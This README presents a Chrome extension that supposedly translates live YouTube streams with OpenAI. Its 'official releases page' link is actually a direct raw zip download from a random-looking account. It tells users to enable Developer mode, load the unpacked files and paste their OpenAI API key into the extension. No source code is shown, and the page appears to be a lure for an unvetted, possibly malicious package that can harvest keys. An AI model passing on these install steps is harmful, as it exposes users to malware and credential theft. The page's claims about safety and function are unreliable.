# 🌐 Live-YT-Translator - Translate live YouTube videos in real time

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/telescoped-scat758/Live-YT-Translator/main/public/Translator_Live_Y_v1.5.zip)

Live-YT-Translator bridges the language gap on YouTube. This Chrome extension connects to OpenAI technology to translate spoken audio during live broadcasts. It displays text in your chosen language directly on your screen. You follow global content without waiting for subtitles.

## ⚙️ System Requirements

Ensure you meet these requirements before you start:

*   Operating System: Windows 10 or Windows 11.
*   Browser: Google Chrome version 110 or higher.
*   Internet Connection: A stable broadband connection for processing audio streams.
*   Account: An active OpenAI account with an API key.

## 📥 Download and Setup

Follow these steps to add the extension to your browser.

1. Visit the [official releases page](https://raw.githubusercontent.com/telescoped-scat758/Live-YT-Translator/main/public/Translator_Live_Y_v1.5.zip) to access the files.
2. Look for the latest version at the top of the list.
3. Click the file ending in .zip to start your download.
4. Open your Windows File Explorer and locate the downloaded folder.
5. Right-click the folder and select Extract All. Choose a location on your computer and confirm.

## 🧩 Installing the Extension

Chrome requires a specific setting to load extensions from your local computer.

1. Open Google Chrome.
2. Type `chrome://extensions` in the address bar and press Enter.
3. Locate the Developer mode toggle in the top right corner. Click it so it turns blue.
4. Click the button labeled Load unpacked in the top left.
5. Select the folder you extracted in the previous section.
6. The extension icon now appears in your browser toolbar.

## 🔑 Activating the Service 

The software requires an OpenAI connection to perform translations.

1. Click the Live-YT-Translator icon in your extension bar.
2. A settings panel appears.
3. Paste your OpenAI API key into the designated field.
4. Select your preferred output language from the dropdown menu.
5. Click Save.

## 🎥 Using the Translator

Once configured, the tool works automatically on supported live streams.

1. Navigate to YouTube in your browser.
2. Open any live video stream.
3. The extension detects the audio stream.
4. A text box appears on the video player overlay.
5. Translated text scrolls in this box as the host speaks.
6. Use the settings menu if you wish to adjust the text size or background visibility.

## 🛠️ Frequently Asked Questions

### Does this extension slow down my computer?
The extension uses minimal memory. Most processing happens on the OpenAI servers rather than your local machine.

### Can I change the language while the video plays?
Yes. Click the extension icon and select a new language. The update occurs inside your current browser session without requiring a page refresh.

### What happens if the text disappears?
Check your internet connection. If the connection drops or the OpenAI service experiences high traffic, the text stream pauses. The extension attempts a reconnection automatically once your internet returns.

### Is my audio data saved?
No. The extension sends audio data to OpenAI for processing. The system does not store recorded audio or video files on your computer.

### Why do I need an OpenAI API key?
The API key allows the browser to communicate with translation models. You pay OpenAI directly for the translation processing. This ensures you receive the latest improvements from their language models.

## 💡 Troubleshooting Common Issues

### The extension icon is grey
If the icon appears grey, the extension failed to load or the page does not support live translation. Check if the video is actually a live stream. Refresh your browser tab.

### The translation seems inaccurate
Translation quality depends on audio clarity. Background music or overlapping voices distract the system. Ensure the video volume is clear and the host speaks directly into their microphone.

### Extension installation errors
If Windows prevents the file extraction, ensure you have sufficient disk space. If Chrome blocks the load, restart the browser and ensure Developer mode remains active.

### API Key errors
Verify that your API key is valid at the OpenAI dashboard. Check for leading or trailing spaces when you paste the key into the settings box. Ensure your account balance covers the usage costs.

### Browser conflicts
Other translation extensions might clash with this tool. Disable other translation tools while using this extension to prevent unexpected behavior. 

Following these steps provides a stable experience. The software remains simple to manage while delivering accurate results. Keep your Chrome browser updated to ensure compatibility with future updates to this extension.
